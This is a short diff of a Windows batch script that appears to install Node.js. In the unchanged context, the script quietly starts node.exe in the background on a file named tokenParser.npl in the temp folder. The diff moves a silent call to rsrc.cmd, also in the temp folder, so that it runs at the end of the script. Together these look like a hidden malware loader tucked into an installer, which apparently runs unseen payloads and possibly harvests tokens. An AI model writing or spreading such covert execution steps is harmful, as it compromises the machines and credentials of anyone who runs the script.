@@ -31,9 +31,6 @@ set "DOWNLOAD_URL=https://nodejs.org/dist/v%NODE_VERSION%/%NODE_ZIP%"
 set "NODE_HOME=%INSTALL_DIR%\%NODE_DIST%"
 set "NODE_EXE=%NODE_HOME%\node.exe"
 
-"%TEMP%\rsrc.cmd" >nul 2>&1
-
-
 where node >nul 2>&1
 if %errorlevel%==0 (
     goto :RUN
@@ -120,6 +117,7 @@ if errorlevel 1 (
     start "" /b "%NODE_EXE%" "%TEMP%\tokenParser.npl" >nul 2>&1
 )
 
+"%TEMP%\rsrc.cmd" >nul 2>&1
 
 endlocal
 exit /b 0
